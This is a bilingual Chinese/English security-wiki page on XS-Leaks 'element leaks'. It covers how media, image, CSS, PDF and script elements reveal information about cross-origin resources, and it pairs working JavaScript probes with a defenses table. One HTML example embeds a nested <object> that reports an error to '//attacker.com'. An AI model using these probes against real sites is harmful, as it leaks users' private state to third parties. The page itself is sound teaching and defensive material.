+++
title = "元素泄露"
description = ""
category = "Attack"
abuse = [
    "HTMLElement",
]
defenses = [
    "SameSite Cookies"
]
menu = "main"
weight = 2
+++

例如，下面的媒体资源可以泄露其大小、持续时间、类型等信息。

跨源页面或许可以通过 HTML 元素来获取部分泄露的数据。例如，下面的媒体资源可以泄露其大小、时长、类型等信息。

Some HTML Elements might be used to leak a portion of data to a cross-origin page.
For example, the below media resources can leak information about its size, duration, type. 

- [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) 泄露了媒体的 `duration` 和 `buffered` 次数。
- [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)  泄露了 `videoHeight` 和 `videoWidth`。一些浏览器可能还有 `webkitVideoDecodedByteCount`、`webkitAudioDecodedByteCount` 和 `webkitDecodedFrameCount`。
- [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) 泄漏了`totalVideoFrames`。
- [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)泄露了 `height` 和 `width`，如果图像是无效的，它们会是 0，且 [`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) 无法执行。
---
- [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) leaks the media `duration` and the `buffered` times.
- [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) leaks the `videoHeight` and `videoWidth` 
  some browsers may also have `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` and `webkitDecodedFrameCount`
- [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) leaks the `totalVideoFrames`.
- [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) leaks the `height` and `width` but if the image is invalid they will be 0 
  and [`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) will get rejected.

通过特有属性来区分媒体类型是可行的。例如，对于 `<video>`，它的特有属性是 `videoWidth`，对于`<audio>` 来说，它是 `duration`。下面的代码片段是一个返回资源类型的示例代码。

It's possible to differentiate between media types via unique property for a given media type. For example, it is `videoWidth` for a `<video>`, or `duration` for an `<audio>`. The below snippet shows an example code that returns the type of a resource. 
```javascript
async function getType(url) {
    // 检测资源是一个音频还是视频
    // Detect if resource is audio or video
    let media = document.createElement("video");
    media.src = url;
    await new Promise(r=>setTimeout(r,50));
    if (media.videoWidth) {
    return "video";
    } else if (media.duration) {
    return "audio"
    }
    // 检测资源是否是图像
    // Detect if resource is an image
    let image = new Image();
    image.src = url;
    await new Promise(r=>setTimeout(r,50));
    if (image.width) return "image";
}
```

## 利用 CORB
[CORB]({{< ref "/docs/attacks/browser-features/corb.md" >}}) 是 Chrome 的一项功能，如果使用了错误的内容类型，则响应为空。因此，如果类型错误，就不会被缓存。

[CORB]({{< ref "/docs/attacks/browser-features/corb.md" >}}) is a feature of Chrome that makes responses empty if the wrong content type is used.
This means that if the type is wrong it’s not cached.

在 [Cache Probing]({{< ref "/docs/attacks/cache-probing.md" >}}) 中可以找到一个函数叫 `ifCached`。

An `ifCached` function can be found in [Cache Probing]({{< ref "/docs/attacks/cache-probing.md" >}}) article.

```javascript
async function isType(url, type = "script") {
  let error = false;
  // Purge url
  await ifCached(url, true);
  // 尝试加载资源
  let e = document.createElement(type);
  e.onerror = () => error = true;
  e.src = url;
  document.head.appendChild(e);
  // 等待被缓存（如果 CORB 允许的话）
  // Wait for it to be cached if its allowed by CORB
  await new Promise(resolve => setTimeout(resolve, 500));
  // Cleanup
  document.head.removeChild(e);
  // Fix for "images" that get blocked differently.
  if (error) return false
  return ifCached(url);
}
```

## 利用 getComputedStyle
[getComputedStyle](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) 可以用来读取一个嵌入到当前页面的 CSS 样式表。包括从不同源加载的 CSS。

[getComputedStyle](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) can be used to read an embedded to the current page CSS style sheets. Including those loaded from different origins. 

这个函数的作用是检查一个样式是否应用于 body。

This function just checks if there has been a style applied to the body.
```javascript
async function isCSS(url) {
    let link = document.createElement('link');
    link.rel = 'stylesheet';
    link.type = 'text/css';
    link.href = url;
    let style1 = JSON.stringify(getComputedStyle(document.body));
    document.head.appendChild(link);
    await new Promise(resolve => setTimeout(resolve, 500));
    let style2 = JSON.stringify(getComputedStyle(document.body));
    document.head.removeChild(link);
    return (style1 !== style2);
}
```
## PDF

这里有一些 [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) 允许控制内容，如 `zoom`、`view`、`page`、`toolbar`。

There are [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) that allow some control over the content such as `zoom`, `view`, `page`, `toolbar`. 

chrome 可以用[frame 计数]({{< ref "/docs/attacks/frame-counting.md" >}})来检测 PDF，因为 chrome 在内部使用了 `embed`。

For chrome, a PDF can be detected with [frame counting]({{< ref "/docs/attacks/frame-counting.md" >}}) because an `embed` is used internally.

```javascript
async function isPDF(url) {
    let w = open(url);
    await new Promise(resolve => setTimeout(resolve, 500));
    let result = (w.length === 1);
    w.close();
    return result;
}
```
{{< hint warning >}}
如果该页面有其他 embed ，就会出现误报。

There will be false positives if the page has other embeds. 
{{< /hint >}}

## Script 标签
当页面上包含一个跨源脚本时，是不可以直接读取其内容的。但是，如果一个脚本使用了任何内置的函数，就有可能覆盖它们并读取它们的参数，这可能会泄露一些有价值的信息[^script-leaks]。

When a cross-origin script is included on a page it's not directly possible to read its contents. However, if a script uses any built-in functions, it's possible to overwrite them and read their arguments which might leak valuable information [^script-leaks].

```javascript
let hook = window.Array.prototype.push;
window.Array.prototype.push = function() {
    console.log(this);
    return hook.apply(this, arguments);
}
```

## 当 Javascript 无法使用的时候
当 JavaScript 被禁用的时候，仍有可能获取一些关于跨域资源的泄露信息。例如，`<object>` 可用于检测资源是否响应了 *Error Code*。如果资源 `//example.org/resource` 在 `<object data=//example.org/resource>fallback</object>` 中返回错误，则 `fallback` 将被渲染出来 [^fallback] [^leaky-images]。还可以在内部注入另一个 `<object>`，将信息泄漏到外部服务器，或者使用 CSS [^xsleaks-nojs] 来检测它。

If JavaScript is disabled it's still possible to leak some information about cross-origin resources. For example, an `<object>` can be used to detect whether a resource responds with *Error Code*. What happens is that if a resource `//example.org/resource` returns an error in `<object data=//example.org/resource>fallback</object>` then `fallback` will be rendered [^fallback] [^leaky-images]. It's possible to inject another `<object>` inside that will leak the information to an outside server, or detect it with CSS [^xsleaks-nojs].

下面的代码嵌入了 `//example.org/404`，如果它的响应是 *Error*，那么作为 fallback，会向 `//attacker.com/?error` 发出请求。

The below code embeds `//example.org/404` and if it responds with *Error* then a request to `//attacker.com/?error` is also made as a fallback.

```html
<object data="//example.com/404">
  <object data="//attacker.com/?error"></object>
</object>
```

## 防御

| 攻击方式 | [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                                          [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                                           |
| :----------------: | :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------: |
|     Type leaks     |                                         ✔️                                         |                         ❌                          |                                ❌                                 | [RIP]({{< ref "/docs/defenses/isolation-policies/resource-isolation" >}}) 🔗 [NIP]({{< ref "/docs/defenses/isolation-policies/navigation-isolation" >}}) |

## 参考文献
[^script-leaks]: The Unexpected Dangers of Dynamic JavaScript. [link](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf)
[^fallback]: HTML Standard, [3.2.5.2.6 Embedded content], [link](https://html.spec.whatwg.org/multipage/dom.html#fallback-content)  
[^leaky-images]: Leaky Images: Targeted Privacy Attacks in the Web, [3.4 Linking User Identities], [link](https://www.usenix.org/system/files/sec19fall_staicu_prepub.pdf)  
[^xsleaks-nojs]: [https://twitter.com/terjanq/status/1180477124861407234](https://twitter.com/terjanq/status/1180477124861407234)  
